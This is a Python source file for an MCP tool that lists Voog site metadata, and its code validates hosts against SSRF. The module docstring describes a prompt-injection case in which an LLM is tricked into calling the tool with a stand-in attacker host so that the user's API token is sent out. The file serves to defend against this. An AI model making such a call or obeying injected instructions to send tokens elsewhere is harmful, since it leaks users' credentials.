"""MCP tool for Voog account discovery via `GET /admin/api/me/sites`.

One tool — `voog_list_my_sites` — wrapping `GET /admin/api/me/sites`.

R6 honesty: Voog API tokens are SITE-SCOPED. A single token returns
metadata for exactly one site (the account that owns the token), so
this tool always returns an array of length 1. To enumerate multiple
sites the operator must supply each site's token separately. The tool
description states this explicitly so the LLM doesn't treat it as
user-wide account enumeration.

Token-exposure trade-off: tokens normally live only on disk in
voog.json (LLM never sees them). Adding a tool that accepts a token
widens the exposure surface. Mitigation:

  - First-class argument is `token_env: str` (env-var NAME, not value).
    The MCP boundary reads `os.environ[token_env]`. The actual secret
    never flows through tool arguments.
  - `token: str` is accepted as a fallback for ad-hoc / dev use, with
    a description-level warning that it will appear in transcripts and
    host logs.
  - `host` defaults to `www.voog.com` (Voog's canonical admin host).
  - `host` is validated against an SSRF-defensive allowlist (see
    `_validate_host` below). This prevents a prompt-injection attack
    where an LLM is tricked into calling `voog_list_my_sites(host=
    "attacker.example.com", token_env="VOOG_API_KEY")` and shipping
    the user's token to a third party as `X-API-Token: <secret>`.

This tool ALSO does NOT use the server's per-site client cache (it has
no `site` argument, and the operator may be probing a tenant not in
voog.json). The MCP server dispatcher must allow this tool to run
without a `site` argument — see _BUILTIN_NO_SITE_TOOLS in server.py.

SECURITY.md (Phase 6, MD6) will document the exposure surface in detail.
"""

import ipaddress
import os
import re

from mcp.types import CallToolResult, TextContent, Tool

from voog.client import VoogClient
from voog.errors import error_response, success_response

_DEFAULT_HOST = "www.voog.com"

# SSRF-defensive host validation. Rejects classes of input that an
# attacker could use to redirect the request away from a legitimate
# Voog admin endpoint. NOT a Voog-domain allowlist — tenants can host
# the admin API on their own primary domain (e.g. `stellasoomlais.com`),
# so a `*.voog.com` allowlist would reject real-world setups. Instead:
# reject local / private / reserved targets that no legitimate Voog
# tenant would ever use.
_HOSTNAME_RE = re.compile(r"^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$")
_PRIVATE_HOST_SUFFIXES = (
    ".local",
    ".internal",
    ".intranet",
    ".onion",
    ".lan",
    ".home",
    ".corp",
    ".test",
    ".example",
    ".invalid",
    ".localhost",
)
_REJECTED_HOSTS = frozenset(
    {
        "localhost",
        "ip6-localhost",
        "ip6-loopback",
        "broadcasthost",
    }
)


def _validate_host(host: str) -> str | None:
    """SSRF-defensive validation for the `host` arg.

    Returns an error message string when the host should be rejected;
    returns ``None`` when the host is acceptable. Rejects:

      - empty / whitespace
      - explicit ports (host:8080) — Voog admin is HTTPS:443 only;
        an embedded port is a strong signal of redirection
      - userinfo (user@host) and credentials in URL form
      - scheme prefix (`http://`, `https://`, etc.) — host must be
        bare; the schema already separates concerns
      - localhost and loopback hostnames
      - raw IPv4 / IPv6 addresses, including loopback / private /
        link-local / reserved ranges
      - private-use TLDs (.local, .internal, .intranet, .onion, .test, …)
      - non-DNS characters (anything outside ``[a-z0-9.-]`` after
        lowercasing — covers Unicode IDN homograph attacks too)
    """
    if not host or not host.strip():
        return "voog_list_my_sites: host must be non-empty"
    h = host.strip().lower()

    # Scheme / userinfo / port — none of these belong in a bare hostname.
    if "://" in h:
        return f"voog_list_my_sites: host must be bare (no scheme), got {host!r}"
    if "@" in h:
        return f"voog_list_my_sites: host must not contain '@' (no userinfo), got {host!r}"
    if "/" in h or "?" in h or "#" in h:
        return f"voog_list_my_sites: host must be a bare hostname (no path), got {host!r}"
    if ":" in h:
        # Could be IPv6 in brackets or an explicit port — reject both.
        # Voog admin is always HTTPS:443.
        return f"voog_list_my_sites: host must not contain ':' (no port / IPv6), got {host!r}"

    # Loopback / well-known local names.
    if h in _REJECTED_HOSTS:
        return f"voog_list_my_sites: host {host!r} is a loopback / reserved name"

    # Raw IPv4 — reject regardless of range. Tenants identify by
    # hostname, not by IP; an IP in this slot is exclusively an
    # attempt to bypass DNS-based defenses.
    try:
        ipaddress.ip_address(h)
        return f"voog_list_my_sites: host {host!r} is a raw IP address; use a hostname"
    except ValueError:
        pass

    # Private-use TLDs.
    for suffix in _PRIVATE_HOST_SUFFIXES:
        if h.endswith(suffix) or h == suffix.lstrip("."):
            return f"voog_list_my_sites: host {host!r} uses a private / reserved TLD ({suffix})"

    # DNS-name shape (allowed chars + label structure). This also
    # blocks IDN homograph attacks (Unicode codepoints don't match
    # the ASCII regex), forcing the caller to use punycode if they
    # genuinely need IDN — which then passes the regex but at least
    # leaves the operator a visible audit trail.
    if not _HOSTNAME_RE.match(h):
        return (
            f"voog_list_my_sites: host {host!r} is not a valid DNS hostname "
            "(use lowercase letters, digits, '.', '-' only; "
            "punycode for IDN)"
        )

    return None


def get_tools() -> list[Tool]:
    return [
        Tool(
            name="voog_list_my_sites",
            description=(
                "Probe `GET /admin/api/me/sites` to discover account "
                "metadata for a Voog token. Returns "
                "`[{name, primary_domain, feature_flags}]`. "
                "R6 NOTE: Voog API tokens are site-scoped, so this tool "
                "returns metadata for the ONE site the token belongs to "
                "— the array is always length 1. To enumerate multiple "
                "sites, the operator must supply each token separately. "
                "Token sourcing: prefer `token_env=` (env var name; "
                "secret stays in the environment). `token=` is a fallback "
                "for ad-hoc use BUT the token will appear in transcripts "
                "and host logs — avoid in production. `host` defaults to "
                "'www.voog.com' (the canonical admin endpoint); override "
                "for tenants on private domains. Read-only."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "token_env": {
                        "type": "string",
                        "minLength": 1,
                        "description": (
                            "Name of an environment variable holding "
                            "the Voog API token (e.g. 'VOOG_API_KEY'). "
                            "Preferred — secret stays in env."
                        ),
                    },
                    "token": {
                        "type": "string",
                        "minLength": 1,
                        "description": (
                            "Raw API token. Fallback only — token will "
                            "appear in transcripts/host logs. Prefer "
                            "token_env= in production."
                        ),
                    },
                    "host": {
                        "type": "string",
                        "minLength": 1,
                        "description": (
                            "Admin host to probe (default www.voog.com). "
                            "Override for tenants on their own primary "
                            "domain (e.g. 'stellasoomlais.com'). Validated "
                            "against SSRF-defensive rules — localhost, "
                            "raw IPs, private TLDs, embedded ports, and "
                            "URL schemes are rejected."
                        ),
                    },
                },
                "required": [],
            },
            annotations={
                "readOnlyHint": True,
                "destructiveHint": False,
                "idempotentHint": True,
            },
        ),
    ]


def _resolve_token(arguments: dict) -> tuple[str | None, str | None]:
    """Resolve a token from arguments. Returns (token, error_message)."""
    token_env = arguments.get("token_env")
    token = arguments.get("token")
    if token_env and token:
        return None, (
            "voog_list_my_sites: supply token_env OR token, not both "
            "(token_env preferred — keeps secret out of transcripts)"
        )
    if token_env:
        if not isinstance(token_env, str) or not token_env.strip():
            return None, "voog_list_my_sites: token_env must be a non-empty string"
        resolved = os.environ.get(token_env)
        # Distinguish "unset" from "set-but-empty" so operators
        # who have e.g. `VOOG_API_KEY=` in their .env (truncated
        # paste, accidental keystroke) get a useful error message.
        if resolved is None:
            return None, (
                f"voog_list_my_sites: env var {token_env!r} is not set "
                "in this process's environment"
            )
        if not resolved.strip():
            return None, (
                f"voog_list_my_sites: env var {token_env!r} is set but empty "
                "(check your .env or shell export)"
            )
        return resolved, None
    if token:
        if not isinstance(token, str) or not token.strip():
            return None, "voog_list_my_sites: token must be a non-empty string"
        return token, None
    return None, "voog_list_my_sites: supply token_env= (preferred) or token="


def _voog_list_my_sites(arguments: dict, _unused_client) -> list[TextContent] | CallToolResult:
    """Build an ad-hoc client (no site lookup) and call /me/sites.

    The second argument is accepted for dispatcher signature compatibility
    but ignored — this tool builds its own client because it does not have
    a `site` parameter to resolve against voog.json.
    """
    token, err = _resolve_token(arguments)
    if err:
        return error_response(err)
    host = (arguments.get("host") or _DEFAULT_HOST).strip()
    # SSRF-defensive validation — see _validate_host docstring.
    # This is THE primary mitigation against prompt-injection
    # token-exfiltration via this tool: an LLM-controllable host
    # parameter that ships the user's token in an HTTP header.
    err = _validate_host(host)
    if err:
        return error_response(err)
    try:
        client = VoogClient(host=host, api_token=token)
        sites = client.get("/me/sites")
    except Exception as e:
        return error_response(f"voog_list_my_sites failed: {e}")
    if not isinstance(sites, list):
        return error_response(
            f"voog_list_my_sites: unexpected response shape "
            f"(expected list, got {type(sites).__name__})"
        )
    note = ""
    if len(sites) == 1:
        note = " (Voog tokens are site-scoped — this token reaches exactly one site)"
    return success_response(
        sites,
        summary=f"🏠 {len(sites)} site(s) reachable from this token{note}",
    )


_DISPATCH = {
    "voog_list_my_sites": _voog_list_my_sites,
}


def call_tool(name: str, arguments: dict | None, client) -> list[TextContent] | CallToolResult:
    # NOTE: no strip_site — this tool has no `site` argument by design.
    arguments = arguments or {}
    handler = _DISPATCH.get(name)
    if handler is None:
        return error_response(f"Unknown tool: {name}")
    return handler(arguments, client)
